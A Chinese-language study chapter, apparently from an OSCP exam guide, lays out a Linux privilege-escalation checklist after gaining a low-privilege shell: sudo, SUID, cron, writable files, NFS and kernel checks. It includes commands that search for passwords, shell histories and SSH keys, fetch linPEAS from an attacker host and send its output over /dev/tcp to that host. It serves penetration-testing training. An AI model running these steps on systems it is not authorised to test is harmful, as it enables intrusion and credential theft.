# Ch 20 — Linux 提權方法論：系統資訊收集清單

> 目標：建立「拿到低權限 Linux shell 後，系統性地找提權路徑」的思維框架和指令清單。

## 提權的本質

提權（Privilege Escalation）= 找一個讓你能以更高權限執行程式碼的設定錯誤、漏洞或配置問題。

Linux 上常見提權路徑：

```
SUDO 設定錯誤     → 能執行特定程式但沒限好
SUID binary      → 有 root 的 SUID，且 GTFOBins 可利用
Cron job 弱權限   → root 的 cron 跑你能寫的腳本
服務漏洞          → root 跑的服務有漏洞
弱檔案權限        → 設定檔可寫，服務重啟時以 root 執行
核心漏洞          → 系統版本舊，有公開 kernel exploit
憑證重用          → 在設定檔找到 root 密碼
```

這章是框架，Ch 21–23 深入各個技術，Ch 24 教怎麼用 linPEAS 自動化。

## 到機器後的第一步：基本資訊

**每次都要跑，不要跳過：**

```bash
# 身份
id
whoami
groups

# SUDO 權限（最重要的一步！）
sudo -l

# 系統基本資訊
uname -a
cat /etc/os-release
cat /proc/version
```

`sudo -l` 永遠是第一個跑的。很多機器的提權路徑就在這裡直接告訴你。

## 系統資訊收集清單

### 1. 核心和 OS 版本

```bash
uname -r          # 核心版本（找 kernel exploit 用）
cat /etc/issue
lsb_release -a
```

把核心版本拿去 searchsploit：

```bash
searchsploit linux kernel 4.4
```

**核心漏洞是最後手段**：不穩定，可能讓系統 crash，OSCP 盡量不用。先找其他路徑。

### 2. 使用者和群組

```bash
cat /etc/passwd | grep -v nologin   # 可登入的帳號
cat /etc/group
id
groups $(whoami)

# 有沒有其他使用者的 home 可以讀？
ls /home
ls -la /home/*/
```

### 3. SUDO 設定

```bash
sudo -l
```

輸出範例：

```
User user may run the following commands on machine:
    (root) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/python3
    (ALL : ALL) ALL
```

- `NOPASSWD:` = 不需要密碼
- `(root)` = 以 root 身份跑
- `/usr/bin/vim` = 指定的程式

有 sudo 權限的程式，去 GTFOBins 查（Ch 21）。

### 4. SUID 和 SGID

```bash
# 找 SUID binary
find / -perm -4000 -type f 2>/dev/null

# 找 SGID
find / -perm -2000 -type f 2>/dev/null
```

### 5. Cron jobs

```bash
cat /etc/crontab
crontab -l            # 當前使用者的 cron
crontab -l -u root    # root 的 cron（通常讀不到）

# 系統級 cron
ls -la /etc/cron*
ls -la /etc/cron.daily /etc/cron.weekly /etc/cron.hourly /var/spool/cron/crontabs/

# 看 /etc/crontab 格式
cat /etc/crontab
```

### 6. 程序和服務

```bash
ps aux | grep root     # root 跑的程序
ps aux | grep -v '^USER'
ss -tlnp               # 本地監聽服務（內網才看到的）
```

### 7. 敏感檔案

```bash
# Web 設定（找資料庫密碼）
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password\|passwd\|db_pass" 2>/dev/null

# 備份或舊版設定
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null

# History（有時有密碼）
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history   # 通常讀不到，但試試

# SSH key
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

### 8. 可寫目錄和檔案

```bash
# 全局可寫目錄
find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|dev\|run"

# 可寫的 root 擁有的檔案
find / -writable -user root -type f 2>/dev/null | grep -v "proc\|sys"
```

### 9. PATH 和環境變數

```bash
echo $PATH
env

# 有沒有可寫的 PATH 目錄？
ls -la $(echo $PATH | tr ':' ' ')
```

### 10. 已安裝套件和版本

```bash
dpkg -l        # Debian/Ubuntu
rpm -qa        # CentOS/RHEL
apt list --installed 2>/dev/null
```

找已知有漏洞的套件版本。

### 11. NFS 掛載

```bash
cat /etc/exports
showmount -e localhost  # 如果 NFS 在跑
```

NFS `no_root_squash` 設定可以提權（Ch 23）。

## 提權路徑優先順序

考試時，按這個順序找：

```
1. sudo -l → 直接看有沒有可用的指令
2. SUID binary → GTFOBins 查
3. 弱密碼 / 憑證重用 → 設定檔找密碼，試 su root
4. Writable cron job → root 跑的腳本你能改
5. Weak file permissions → 關鍵設定檔可寫
6. NFS no_root_squash
7. PATH hijacking
8. Kernel exploit（最後手段）
```

## 自動化：linPEAS 先跑後分析

```bash
# 傳到靶機
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# 執行並存輸出
/tmp/linpeas.sh | tee /tmp/linpeas_out.txt

# 或直接在 Kali 看（靶機執行，輸出到 Kali）
# 靶機：
/tmp/linpeas.sh > /dev/tcp/10.10.14.5/9999
# Kali：
nc -nvlp 9999 | tee linpeas_out.txt
```

linPEAS 用顏色標記嚴重程度：
- **紅色/黃色**：高可能性的提權路徑，優先看
- 橙色：值得調查
- 綠色：正常，不一定有問題

Ch 24 專門講如何解讀 linPEAS 輸出。

## 常見卡關排錯

| 症狀 | 原因 / 解法 |
|------|-------------|
| linPEAS 跑完一堆紅字還是沒思路 | 紅/黃 highlight 只是提示，不是答案。按優先序看：`sudo -l` → SUID → cron → 可寫的 service/檔案 → 內核版本（最後才考慮 kernel exploit） |
| `sudo -l` 要密碼但沒有密碼 | 跳過這條，走 SUID/cron/capabilities。別卡在這。很多機器根本不靠 sudo 提權 |
| 找到 SUID binary 但不知能不能用 | 立刻查 GTFOBins（Ch 21）。不在清單上的自訂 binary，用 `strings`/`ltrace` 看它呼叫了什麼（常見：用相對路徑呼叫其他程式 → PATH 劫持，Ch 23） |
| shell 很破（沒 tab 補全、Ctrl-C 會斷） | 先升級 TTY：`python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`。破 shell 會讓你誤判很多東西 |
| 什麼都試過還是卡 | 檢查是否漏枚舉：`/home/*` 下的設定檔/history/`.ssh`、資料庫憑證、`/var/www` 原始碼、`cron` 裡呼叫的腳本你有沒有寫權限、`getcap -r / 2>/dev/null` |
| 想用 kernel exploit（如 DirtyCow/PwnKit） | 當**最後手段**。先確認版本精確匹配，exploit 可能讓機器當掉——考試環境重開要排隊，影響分數 |

> **方法論 > 運氣**：Linux 提權不是「猜」，是把清單跑完。`sudo -l`、SUID、cron、可寫檔、capabilities、NFS 這六類枚舉完，九成機器的路徑就浮出來了。

## 本章對應靶機

所有 Part 5 的靶機都從這章的收集清單開始：
- 拿到 shell 後，先跑完整的手動清單
- 再跑 linPEAS
- 比較兩個的輸出

## 自我檢核

- [ ] 能背出「到 Linux shell 後的前 5 個指令」
- [ ] 知道 `sudo -l` 輸出中 `NOPASSWD` 和指定程式的意義
- [ ] 能用 `find -perm -4000` 找 SUID binary
- [ ] 知道提權路徑的優先順序（sudo > SUID > cron > kernel）

→ [Ch 21 SUID / SUDO 提權：GTFOBins 活用](./21-suid-sudo.md)
